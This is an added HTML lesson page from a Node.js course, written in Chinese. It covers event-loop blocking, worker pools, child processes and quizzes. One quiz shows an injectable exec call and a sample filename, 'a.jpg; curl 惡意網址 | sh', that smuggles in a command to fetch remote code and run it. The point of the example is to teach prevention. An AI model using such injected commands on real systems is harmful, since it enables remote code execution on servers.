+<p>範例用 <code>process.execPath</code> 當要執行的檔案：它是目前這個 node 的完整路徑。啟動 Node 寫的程式時用它，不要依賴 PATH 上的 <code>node</code>，子程序的 Node 版本才會跟伺服器一樣。</p>
+<p>最後回到這課的主題：伺服器裡不要用 <code>execSync</code>／<code>spawnSync</code>。它們是 <code>*Sync</code> API，會讓 JavaScript 執行緒一直停著等子程序結束，等於把卡住的問題又搬回 event loop。</p>
+
+<div class="callout practice"><strong>💡 實務上：呼叫外部程式要跟維運一起想</strong><br>咖啡店要寄 PDF 收據、把商品照片轉檔，常會呼叫現成的命令列工具。容易忘的是部署：程式在你電腦上能跑，是因為你裝過那個工具，正式環境的機器也要裝，而且版本要一致。另外要限制同時跑幾個，一次啟動一百個轉檔程序，整台機器的 CPU 和記憶體都會被吃光，這時子程序也需要像 worker pool 一樣排隊。資安 review 時會特別搜尋 <code>exec(</code> 和 <code>shell: true</code>，看有沒有使用者輸入被串進指令字串。</div>
+
+<p>三種解法都看過了。下次遇到慢的工作，不一定是報表或發票，要怎麼決定用哪一種？</p>
+
+<h2>遇到慢的工作，該選哪一種？</h2>
+<p>先別急著選解法。前面每一節都有一個共同的前提：確定是 CPU 在卡。所以判斷順序是：</p>
+<ol>
+  <li><strong>先量</strong>：看 event loop 延遲和 ELU（第二節），需要時用 <a href="23-profiling-memory.html">第 23 課</a>的 profile 找出是哪段程式。延遲不高、只有某支 API 慢，問題在等待，worker 救不了。</li>
+  <li><strong>先少算</strong>：能不能不要每次都算？報表可以快取起來、分頁只算需要的部分，或讓資料庫先彙總好。不用算的工作最快。</li>
+  <li><strong>還是要算，再選表上最簡單能解決的那一個</strong>：</li>
+</ol>
+<div class="table-wrap"><table>
+  <tr><th>做法</th><th>適合</th><th>代價</th></tr>
+  <tr><td>分段處理</td><td>偶爾一次、幾百毫秒的計算</td><td>只用一顆 CPU；每段之間要能暫停</td></tr>
+  <tr><td>worker pool</td><td>經常發生的 CPU 密集工作（報表、壓縮、雜湊）</td><td>傳資料要複製；要處理 worker 的錯誤和結束</td></tr>
+  <tr><td>子程序</td><td>外部程式、要隔離記憶體或當掉的風險</td><td>啟動比 worker 更慢；要處理逾時、結束碼、注入</td></tr>
+  <tr><td>獨立服務或佇列</td><td>要跑好幾分鐘、失敗要重試、要跨機器（<a href="../../nestjs/lessons/20-queues-bullmq.html">NestJS 課第 20 課</a>、<a href="../../postgresql/lessons/33-job-queue.html">PostgreSQL 課第 33 課</a>）</td><td>多一套系統要維運；結果要非同步通知</td></tr>
+</table></div>
+<p>最後一列是這課沒有實作、但要知道邊界的做法。worker 和子程序都還是活在這個伺服器程序底下：部署重啟或程序當掉時，算到一半的工作就沒了，也不會自動重試。月底結算這種要跑好幾分鐘、不能遺失的工作，要放進佇列，由另外的程序去算。同樣地，worker 只解決「CPU 卡住」，不解決「一個程序當掉全部停擺」，那要靠多個程序（<a href="24-scaling.html">第 24 課</a>）。</p>
+<p>用這個順序回頭看咖啡店的每日報表：先量到 event loop 延遲衝到 1.6 秒，確認是 CPU；報表每天都有人按、每次都要算幾百萬筆，屬於「經常發生的 CPU 密集工作」，所以用 worker pool；開發票是外部程式，用 <code>execFile</code> 加參數陣列和逾時。</p>
+
+<h2>練習</h2>
+<p>在 <code>learn/</code> 執行 <code>node check.mjs node 09</code>。三題分別對應三種解法；<code>orders.ts</code>、<code>daily-report.ts</code>、<code>report-worker.ts</code>、<code>server.ts</code>、<code>tools/</code> 都已經寫好，不用改。測試用隨機的日期和資料，整份跑完約 20 秒。</p>
+
+<div class="local" data-test="ex1" data-files="report-async.ts">
+  <p>練習 1：<code>daily-report.ts</code> 的 <code>computeDailyReport(orders)</code> 一口氣同步算完。在 <code>report-async.ts</code> 寫 <code>computeDailyReportAsync(orders)</code>：結果要和同步版完全一樣，但計算期間 event loop 要能回應。用 <code>daily-report.ts</code> 匯出的 <code>createTally()</code>、<code>addOrder(tally, order)</code>、<code>finishReport(tally)</code> 自己寫迴圈，切成小段，每段之間讓出。</p>
+  <p>測試用 30–40 萬筆隨機訂單，旁邊跑一個每輪 event loop 都記一次的 <code>setImmediate</code>，數出你每段一口氣處理了幾筆：最大的一段不能超過 2 萬筆（不然那段時間誰都動不了），平均每段至少 100 筆（每筆都讓出，讓出的成本會比計算還多）。最後一段不滿也要算到。</p>
+</div>
+
+<div class="local" data-test="ex2" data-files="report-pool.ts">
+  <p>練習 2：在 <code>report-pool.ts</code> 寫 <code>createReportPool({ size })</code>，回傳 <code>{ run(job), close() }</code>。<code>report-worker.ts</code> 的約定寫在檔案開頭：送 <code>{ id, job }</code>，回 <code>{ id, report }</code> 或 <code>{ id, error }</code>。要求：</p>
+  <ul>
+    <li>一建立就開 <code>size</code> 個 worker 並重複使用；全部在忙時排隊，先來先做。</li>
+    <li>用 <code>id</code> 把回傳的訊息對回那個工作：<code>report</code> 就 resolve，<code>error</code> 就 reject（只有那個工作失敗）。</li>
+    <li>worker 意外結束（<code>'error'</code>、<code>'exit'</code>）時，它手上的工作 reject，並補一個新的 worker，之後的工作照常。</li>
+    <li><code>close()</code> 終止所有 worker，等它們結束。</li>
+  </ul>
+  <p>測試把你的 pool（size 2）交給 <code>server.ts</code>，同時送 6 個 <code>/reports/daily</code> 再打 <code>/health</code>：<code>/health</code> 要在報表全部算完之前回應，6 份報表正確，<code>threadId</code> 是你開的 worker，而且剛好 2 條。接著先送一個大工作、再送一個小工作（小的先算完，各自要拿到自己的報表），讓讀取訂單丟錯（那個請求 500、其他正常），再讓 worker <code>process.exit(1)</code>（那個請求 500，之後 4 份報表仍要用 2 條執行緒算完）。最後另開一個程序 run 一次再 <code>close()</code>，程序要自己結束。寫好之後可以執行 <code>node server.ts</code>，用 <code>curl localhost:3000/reports/daily?day=3</code> 試試看。</p>
+</div>
+
+<div class="local" data-test="ex3" data-files="invoice.ts">
+  <p>練習 3：<code>invoice.ts</code> 的 <code>createInvoice(customerName, items)</code> 要呼叫舊程式 <code>tools/legacy-invoice.ts</code>（用法寫在它的開頭），回傳它印出的 JSON。同事寫的版本能動，但有三個問題，全部修好：</p>
+  <ul>
+    <li>客人姓名可能有空白、引號、<code>$()</code>、反引號：外部程式要收到一模一樣的名字，而且什麼指令都不能被執行。</li>
+    <li>外部程式超過 2 秒沒結束，要終止它並 reject。</li>
+    <li>結束碼非 0 時要 reject，錯誤訊息要包含它的 stderr（例如「未知的品項：珍珠奶茶」）。</li>
+  </ul>
+  <p>用 <code>process.execPath</code> 執行它；不要另外指定 <code>env</code> 或 <code>cwd</code>，測試會透過環境變數和工作目錄檢查子程序。</p>
+</div>
+
+<div class="quiz" data-correct="c">
+  <p>練習 4：同事把 <code>function buildReport(orders)</code> 改成 <code>async function buildReport(orders)</code>，內容不變（一個大迴圈，沒有 <code>await</code>），說「這樣就是非同步，不會卡住伺服器了」。對嗎？</p>
+  <label data-key="a">對，async 函式會在背景的執行緒執行</label>
+  <label data-key="b">對，呼叫端加上 await 就會讓出執行緒</label>
+  <label data-key="c">不對，迴圈還是在主執行緒上同步跑完，期間誰都動不了</label>
+  <label data-key="d">不對，async 函式反而會讓迴圈變慢一倍</label>
+  <p class="why">✓ <code>async</code> 只改變回傳值（包成 Promise），函式本體在呼叫的當下同步執行，直到第一個 <code>await</code>；沒有 <code>await</code> 就整段跑完才回傳。JavaScript 不會自動把它移到別的執行緒（a 錯）。呼叫端的 <code>await</code> 是等它跑完之後才繼續，迴圈期間一樣卡住（b 錯）。效能大致一樣，問題在阻塞，不在速度（d 錯）。要不卡住就分段讓出，或交給 worker。</p>
+</div>
+
+<div class="quiz" data-correct="b">
+  <p>練習 5：報表 API 的寫法是「每個請求 <code>new Worker()</code>，算完 <code>terminate()</code>」。平常很順，促銷日 300 個人同時按報表，伺服器記憶體用完被系統砍掉。最好的修正是什麼？</p>
+  <label data-key="a">把 <code>resourceLimits</code> 調小，每個 worker 用少一點記憶體</label>
+  <label data-key="b">改成固定大小的 worker pool，數量約等於 CPU 核心數，多的工作排隊</label>
+  <label data-key="c">改回主執行緒計算，因為 worker 太耗記憶體</label>
+  <label data-key="d">在 worker 裡也用分段處理</label>
+  <p class="why">✓ 每個 worker 都有自己的 V8 和記憶體，啟動也要時間；300 個請求就是 300 條執行緒，而 CPU 只有幾顆，多開只會互搶。固定大小的 pool 讓同時在算的數量有上限，多的排隊，記憶體可預期。a 只是讓每個 worker 更容易因為記憶體不足被終止，數量問題還在；c 會讓所有請求被卡住；d 跟數量無關。</p>
+</div>
+
+<div class="quiz" data-correct="d">
+  <p>練習 6：上傳圖片後要轉成縮圖：<code>exec(`convert ${filename} -resize 200x200 thumb.jpg`)</code>，<code>filename</code> 是使用者上傳時的檔名。最主要的風險和修正是？</p>
+  <label data-key="a">沒有風險，檔名一定只有英數字</label>
+  <label data-key="b">檔名有空白會失敗，用引號把 <code>${filename}</code> 包起來就好</label>
+  <label data-key="c">exec 太慢，改用 execSync</label>
+  <label data-key="d">shell 注入：檔名裡的 <code>;</code>、<code>$()</code> 會被當成指令；改用 <code>execFile('convert', [filename, '-resize', '200x200', 'thumb.jpg'])</code></label>
+  <p class="why">✓ 檔名是使用者決定的，可以是 <code>a.jpg; curl 惡意網址 | sh</code>。<code>exec</code> 把整行交給 shell 解讀，就會執行。加引號擋不住（b），檔名自己帶一個引號就跳出去了。<code>execSync</code> 一樣經過 shell，還會卡住 event loop（c）。參數陣列不經過 shell，檔名再奇怪都只是一個參數；記得再加上 <code>timeout</code>。更穩的做法是存檔時改用伺服器自己產生的檔名，使用者給的檔名只拿來顯示。</p>
+</div>
+
+<h2>常見錯誤</h2>
+<ul>
+  <li><strong>處理請求時用 <code>*Sync</code> API</strong>：<code>readFileSync</code>、<code>pbkdf2Sync</code>、<code>execSync</code> 期間整個程序停住。啟動階段可以，請求裡一律用非同步版本。</li>
+  <li><strong>把 microtask 當成讓出</strong>：<code>await Promise.resolve()</code>、<code>queueMicrotask</code>、<code>process.nextTick</code> 都在進入下一個 phase 前清空。分段之間要 <code>await</code> 一次 <code>setImmediate</code>。</li>
+  <li><strong>在執行緒之間傳超大物件</strong>：結構化複製在主執行緒上做，幾十萬筆的陣列複製比計算還慢。傳 id 或查詢條件讓 worker 自己讀；二進位資料用 transfer。</li>
+  <li><strong>沒聽 worker 的 <code>error</code> 和 <code>exit</code></strong>：沒人聽的 <code>error</code> 會讓主執行緒丟錯；worker 當掉時手上的工作永遠不會完成，請求卡住，pool 越來越小。</li>
+  <li><strong>以為 worker 讀得到主執行緒的變數</strong>：兩邊的記憶體是分開的，只能傳訊息，傳過去的是複製品。</li>
+  <li><strong>用 <code>exec</code> 串字串</strong>：使用者輸入會變成 shell 指令。用 <code>execFile</code>／<code>spawn</code> 加參數陣列，也不要開 <code>shell: true</code>。</li>
+  <li><strong>子程序沒有逾時、不看結束碼</strong>：外部程式卡住時請求永遠不回；失敗時拿到空的 stdout 還當成功。設 <code>timeout</code>，結束碼非 0 就 reject，錯誤帶上 stderr。</li>
+</ul>
+
+<h2>補充與查表</h2>
+<p>主線用不到、但工作上會查的細節集中在這裡。</p>
+<ul>
+  <li><strong>worker 的入口檔可以是 <code>.ts</code></strong>：<code>new Worker(new URL('./x.ts', import.meta.url))</code> 一樣會擦掉型別（v24.22.1 本機驗證）。</li>
+  <li><strong>限制 worker 的記憶體</strong>：<code>new Worker(檔案, { resourceLimits: { maxOldGenerationSizeMb: 256 } })</code>，超過時只有那個 worker 被終止。</li>
+  <li><strong>移交大量二進位資料</strong>：真的要傳大量二進位資料（例如圖片）時，可以把 <code>ArrayBuffer</code> 放進第二個參數 <code>postMessage(data, [buffer])</code> <strong>移交</strong>（transfer）：所有權直接交給 worker，不用複製，但主執行緒這邊就不能再用它了。</li>
+  <li><strong>子程序的輸出上限</strong>：<code>execFile</code>／<code>exec</code> 的輸出超過 <code>maxBuffer</code>（預設 1MB）時子程序會被終止，大輸出改用 <code>spawn</code> 讀 stream。</li>
+  <li><strong>Permission Model</strong>：<a href="25-security.html">第 25 課</a>的 Permission Model 開啟時，開 worker 要加 <code>--allow-worker</code>，開子程序要加 <code>--allow-child-process</code>。</li>
+</ul>
+
+<h2>小結</h2>
+<ul>
+  <li>每日報表卡住所有客人，是因為 JavaScript 只在一條執行緒上跑，CPU 密集的同步計算會阻塞它，期間新的請求和計時器都進不來。I/O 密集的工作在等待時會交出執行緒，不會這樣。</li>
+  <li>證明是 event loop 被卡住：<code>monitorEventLoopDelay</code> 量計時器晚了多久（看 max 和 p99），<code>eventLoopUtilization</code> 量執行緒有多忙。等資料庫不會讓延遲升高。</li>
+  <li>除了自己寫的迴圈，<code>*Sync</code> API、超大 JSON、災難性回溯的正規表示式（ReDoS）也會卡住；啟動階段可以同步，處理請求的路徑上不行。</li>
+  <li>分段處理：切成每段幾毫秒，每段之間 <code>await</code> <code>setImmediate</code>；<code>async</code> 和 microtask 都不會讓出。只用一顆 CPU。</li>
+  <li>worker_threads：另一條執行緒、另一份記憶體，資料用結構化複製傳遞，所以只傳小的資料。用固定大小的 pool：重複使用、排隊、用 id 對應結果、聽 <code>error</code>／<code>exit</code> 並補 worker、<code>terminate()</code> 收尾。</li>
+  <li>子程序：<code>execFile</code>／<code>spawn</code> 加參數陣列，不經過 shell，避免 shell 注入；一定要設逾時、檢查結束碼、保留 stderr。</li>
+  <li>選擇：先量，先少算，再選最簡單能解決的；長時間、要重試、不能遺失的工作交給佇列。</li>
+</ul>
+<p>下一課回到最常見的 I/O：讀寫檔案。相對路徑從哪裡算、讀檔失敗怎麼分辨原因、怎麼寫檔才不會讓別人讀到半份 JSON，以及兩筆訂單同時存檔時怎麼不掉資料。</p>
+<h2>階段檢核：面試會問的觀念</h2>
+<p>這個階段一定要講得出來的 7 件事。先在心裡回答，再選。</p>
+
+<div class="quiz" data-correct="b">
+  <p>練習 7：尖峰時段登入（非同步的 <code>crypto.pbkdf2</code>）變慢，同時讀菜單檔案（<code>fs.promises.readFile</code>）也變慢；但 <code>/health</code> 正常，event loop 延遲的 p99 只有幾毫秒。最可能的原因是？</p>
+  <label data-key="a">密碼雜湊在 JavaScript 執行緒上算，佔住了唯一的那條執行緒</label>
+  <label data-key="b">雜湊和讀檔共用預設 4 條的 thread pool，超過 4 件就排隊</label>
+  <label data-key="c">讀檔和連線共用作業系統的 epoll，登入請求一多，讀檔就排在後面</label>
+  <p class="why">✓ 非同步的 pbkdf2、檔案讀寫、<code>dns.lookup</code> 都交給 thread pool，網路收發交給作業系統，所以 <code>/health</code> 不受影響。先量出是不是 pool 在排隊，再決定要不要在啟動設定調 <code>UV_THREADPOOL_SIZE</code>；CPU 核心不多時，雜湊不會因此變快。a 錯在 JavaScript 執行緒被佔住時，<code>/health</code> 會一起慢、event loop 延遲也會很高。（第 7 課）</p>
+</div>
+
+<div class="quiz" data-correct="a">
+  <p>練習 8：客服回報「整個網站偶爾全部卡 1～2 秒，連 <code>/health</code> 也一樣」。監控上同一時間 event loop 延遲的 max 衝到 1800ms，ELU 接近 100%。先查什麼？</p>
+  <label data-key="a">順著 handler 找同步的重工作：<code>*Sync</code> API、大 JSON、對使用者輸入跑的正規表示式</label>
+  <label data-key="b">查資料庫的慢查詢，某支 API 的查詢太久，其他請求都在等它的結果</label>
+  <label data-key="c">把 <code>UV_THREADPOOL_SIZE</code> 調大，讓卡住的工作有更多執行緒可以分著做</label>
+  <p class="why">✓ event loop 延遲是計時器實際晚了多久；衝到秒級、ELU 又是滿的，代表 JavaScript 執行緒被同步的工作佔住，所有請求一起等。找到後依情況分段、搬到 worker，或先少算。b 錯在等資料庫是 I/O，等待時 event loop 照樣在處理別的請求，只有那支 API 慢，延遲不會升高。（第 9 課）</p>
+</div>
+
+<div class="quiz" data-correct="d">
+  <p>練習 9：重算 40 萬筆訂單的集點，同事已經分段了，<code>/menu</code> 卻還是在重算期間完全沒有回應。哪裡出事？</p>
+<pre>async function rebuildPoints(orders) {
+  for (let i = 0; i &lt; orders.length; i += 5_000) {
+    orders.slice(i, i + 5_000).forEach(addPoints)
+    await Promise.resolve()   // 讓其他請求插進來
+  }
+}</pre>
+  <label data-key="a">每段 5000 筆太大，改成每段 100 筆，其他請求就插得進來</label>
+  <label data-key="b"><code>forEach</code> 是同步的，要改成 <code>for await</code> 才會在每筆之間讓出</label>
+  <label data-key="c">呼叫端沒有 <code>await rebuildPoints()</code>，所以迴圈在背景一直跑</label>
+  <label data-key="d"><code>await</code> 的是 microtask，進入下一個 phase 前就清空，迴圈還是一口氣跑完</label>
+  <p class="why">✓ microtask 在離開目前這段 callback 前全部跑完，event loop 到不了 poll，計時器和請求都輪不到。分段之間要 <code>await</code> 一次 <code>node:timers/promises</code> 的 <code>setImmediate</code>，等它時 event loop 會走完一圈。a 錯在段切得再小，只要讓出用的是 microtask，迴圈一樣不會停下來。（第 7、9 課）</p>
+</div>
+
+<div class="quiz" data-correct="c">
+  <p>練習 10：每天凌晨的對帳腳本印出「對帳完成」後一直不結束，排程最後判它逾時。同事在最後一行補上 <code>process.exit(0)</code>。怎麼回應？</p>
+  <label data-key="a">可以：腳本的工作都做完了，用 exit 收尾比等它自己結束更明確</label>
+  <label data-key="b">改成 <code>setTimeout(() =&gt; process.exit(0), 1000)</code>，等輸出寫完再結束</label>
+  <label data-key="c">先用 <code>process.getActiveResourcesInfo()</code> 查誰撐著，在 <code>finally</code> 關掉它</label>
+  <p class="why">✓ 程序在沒有 ref 的 handle 時才結束；印完不結束，多半是資料庫連線池或 Redis 連線還開著。關掉它讓程式自然結束，要回報失敗就設 <code>process.exitCode</code>。b 錯在等 1 秒只是猜輸出寫完了，硬砍的問題還在，該關的連線也照樣沒人關。（第 7 課）</p>
+</div>
+
+<div class="quiz" data-correct="a">
+  <p>練習 11：集點服務逾時的那天，程序以結束碼 1 結束，log 裡卻沒有 <code>catch</code> 記下的錯誤。為什麼？</p>
+<pre>board.on('paid', async (order) =&gt; {
+  await points.add(order.customerId)   // 集點服務偶爾逾時
+})
+
+try {
+  board.emit('paid', order)
+} catch (err) {
+  log.error(err)
+}</pre>
+  <label data-key="a">emit 不 await 監聽器回傳的 Promise，reject 時沒人處理，變成 unhandled rejection</label>
+  <label data-key="b">board 沒有掛 <code>error</code> 監聽器，逾時的錯誤被轉成 error 事件，沒人聽就 throw</label>
+  <label data-key="c">emit 是非同步的，try 區塊結束時監聽器還沒開始執行，所以 catch 接不到</label>
+  <p class="why">✓ try/catch 只接得到監聽器同步 throw 的錯誤；async 監聽器的 rejection 發生在 emit 回傳之後，沒人等它，Node 24 預設以結束碼 1 結束。在監聽器裡 try/catch，或建立 emitter 時傳 <code>captureRejections: true</code> 並掛 <code>error</code> 監聽器。c 錯在 emit 是同步的，監聽器當場就開始執行，跑到第一個 <code>await</code> 才回到 emit。（第 8 課）</p>
+</div>
+
+<div class="quiz" data-correct="c">
+  <p>練習 12：上線一週後，log 開始出現 <code>MaxListenersExceededWarning: … 11 ready listeners added</code>，記憶體也慢慢漲。哪裡出事？</p>
+<pre>function waitForReady(board, id, { signal, timeoutMs }) {
+  return new Promise((resolve, reject) =&gt; {
+    const onReady = (o) =&gt; { if (o.id === id) resolve(o) }
+    board.on('ready', onReady)
+    setTimeout(() =&gt; reject(new Error('逾時')), timeoutMs)
+    signal.addEventListener('abort', () =&gt; reject(signal.reason))
+  })
+}</pre>
+  <label data-key="a">resolve 之後計時器還會 reject，同一個 Promise 被拒絕兩次，Node 就發出警告</label>
+  <label data-key="b">超過 10 個監聽器後新的加不上去，第 11 個客人永遠等不到自己的訂單</label>
+  <label data-key="c">等到、逾時、取消之後都沒拿掉監聽器和計時器，每次呼叫都留下一組</label>
+  <p class="why">✓ 三種結局都要走同一個 cleanup：<code>board.off('ready', onReady)</code>、移除 abort 監聽器、<code>clearTimeout</code>，再 resolve 或 reject；這段還少了開頭的 <code>signal.aborted</code> 檢查。警告是洩漏的線索，用 <code>--trace-warnings</code> 找來源，不要只調高上限。b 錯在警告不會擋住任何東西，第 11、12 個監聽器照樣加得上去。（第 8 課）</p>
+</div>
+
+<div class="quiz" data-correct="d">
+  <p>練習 13：月底結算要算 3～5 分鐘，算完寄 email 給店長；部署或當掉時不能就這樣不見，失敗要能重試。用哪一種做法？</p>
+  <label data-key="a">worker pool：在另一條執行緒算，主執行緒照常回應請求</label>
+  <label data-key="b">分段處理：每段之間讓出，不用多開執行緒或程序</label>
+  <label data-key="c">子程序：用 <code>execFile</code> 執行結算程式，當掉也不影響伺服器</label>
+  <label data-key="d">佇列：API 只把工作放進去就回應，由另外的程序去算</label>
+  <p class="why">✓ 跑好幾分鐘、失敗要重試、不能因為重啟而遺失的工作，交給佇列和獨立的工作程序，結果再非同步通知。a 錯在 worker 只解決 CPU 卡住的問題，工作還活在這個程序裡：部署或當掉時算到一半就沒了，也沒有重試。（第 9 課）</p>
+</div>
+<p>這個階段的重點整理成<a href="../sheets/stage-2.html">一頁圖解</a>。</p>
+<p>下一課進到檔案與位元組：用 <code>fs/promises</code> 讀寫檔案，處理錯誤碼，並且讓檔案寫到一半當機也不會壞掉。</p>
+
+</main>
+<script type="module" src="../lab.js"></script>
+</body>
+</html>
